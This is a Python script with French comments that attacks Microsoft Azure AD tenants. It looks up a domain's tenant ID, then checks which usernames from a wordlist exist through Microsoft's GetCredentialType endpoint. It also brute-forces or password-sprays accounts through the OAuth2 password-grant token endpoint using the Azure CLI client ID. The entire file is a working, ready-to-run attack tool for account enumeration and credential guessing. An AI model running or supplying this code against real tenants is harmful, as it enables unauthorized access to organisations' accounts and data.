import requests,os,json,argparse,sys
from datetime import datetime

# Récupération du tenant_id
def get_tenant_id(domain):
    url = f"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        issuer = data.get("issuer")
        tenant_id = issuer.split(".net")[1].strip("/").split("/")[0]
        return tenant_id
    else:
        return 0

# Vérifie si un utilisateur existe (via endpoint MS)
def check_users(email):
    url = "https://login.microsoftonline.com/common/GetCredentialType"
    headers = {"Content-Type": "application/json"}
    data = {"username": email}

    response = requests.post(url, json=data, headers=headers)
    if response.status_code == 200:
        result = response.json()
        # 0 signifie que l'utilisateur existe
        return result.get("IfExistsResult") == 0
    else:
        print(f"Erreur HTTP {response.status_code} pour {email}")
        return False

# Fonction pour énumérer les utilisateurs via wordlist
def users_enum(domain):
    while True:
        print("Est-ce que vous voulez énumérer les utilisateurs ? (Y/N)")
        choose = input("> ").strip().upper()

        if choose == "Y":
            print("Chemin de votre wordlist :")
            word = input("> ")

            if not os.path.isfile(word):
                print("[!] Fichier introuvable.")
                continue
            else:
                print("[+] Fichier trouvé.")
                with open(word, "r") as f:
                    results = []
                    for line in f:
                        username = line.strip()
                        email = f"{username}@{domain}"
                        exists = check_users(email)
                        if exists:
                            print(f"[+] {email} existe")
                            results.append({
                                "email": email,
                                "exists": True
                            })
                        else:
                            print(f"[-] {email} n'existe pas")
                            results.append({
                                "email": email,
                                "exists": False
                            })

                # Sauvegarde en json
                filename = f"enum_result_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(filename, "w") as outfile:
                    json.dump(results, outfile, indent=4)
                print(f"[✔] Résultats sauvegardés dans {filename}")

                return

        elif choose == "N":
            print("Enumération annulée")
            return

        else:
            print("Choix invalide. Répondez par Y ou N.")

# Fonction pour tester login avec un mot de passe
def check_login(email, password):
    token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    client_id = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Client public Azure CLI

    data = {
        "client_id": client_id,
        "scope": "https://graph.microsoft.com/.default",
        "grant_type": "password",
        "username": email,
        "password": password
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        response = requests.post(token_url, data=data, headers=headers, timeout=5)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        print(f"Erreur lors de la vérification login : {e}")
        return False

# Brute force des mots de passe pour un utilisateur donné
def brute_force(domain, username, wordlist_path):
    if not os.path.isfile(wordlist_path):
        print("[!] Fichier wordlist introuvable.")
        return

    email = f"{username}@{domain}"
    print(f"[+] Bruteforce pour {email} avec la wordlist {wordlist_path}")

    with open(wordlist_path, "r") as f:
        for line in f:
            password = line.strip()
            if not password:
                continue
            if check_login(email, password):
                print(f"[+] Mot de passe trouvé : {password}")
                return password  # succès
            else:
                print(f"[-] Mot de passe incorrect : {password}")

    print("[!] Bruteforce terminé, aucun mot de passe valide trouvé.")
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Enumération des utilisateurs Azure AD")
    parser.add_argument("domain", help="Nom de domaine à tester (ex: exemple.fr)")
    parser.add_argument("--username", "-u", help="Nom d'utilisateur ou fichier wordlist usernames pour bruteforce", default=None)
    parser.add_argument("--password", "-p", help="Mot de passe ou fichier wordlist mots de passe pour bruteforce", default=None)
    args = parser.parse_args()

    if (args.username is None and args.password is not None) or (args.username is not None and args.password is None):
        print("[!] Les arguments -u et -p doivent être fournis ensemble.")
        parser.print_help()
        sys.exit(1)

    domain = args.domain

    tenant = get_tenant_id(domain)
    if tenant == 0:
        print("[!] The domain does not belong to the Azure cloud")
        sys.exit(1)
    else:
        print(f"Tenant ID: {tenant}")

    if args.username and args.password:
        # Si username est un fichier (liste d'utilisateurs)
        if os.path.isfile(args.username):
            # Lire chaque user
            with open(args.username, "r") as uf:
                usernames = [line.strip() for line in uf if line.strip()]

            # Si password est un fichier (liste de mots de passe)
            if os.path.isfile(args.password):
                for user in usernames:
                    print(f"[+] Bruteforce pour {user}@{domain} avec la wordlist {args.password}")
                    brute_force(domain, user, args.password)
            else:
                # Password unique
                for user in usernames:
                    email = f"{user}@{domain}"
                    if check_login(email, args.password):
                        print(f"[+] Connexion réussie avec {email} / {args.password}")
                    else:
                        print(f"[-] Échec de connexion avec {email} / {args.password}")
        else:
            # username simple, pas fichier
            email = f"{args.username}@{domain}"
            if os.path.isfile(args.password):
                brute_force(domain, args.username, args.password)
            else:
                if check_login(email, args.password):
                    print(f"[+] Connexion réussie avec {email} / {args.password}")
                else:
                    print(f"[-] Échec de connexion avec {email} / {args.password}")
    else:
        users_enum(domain)
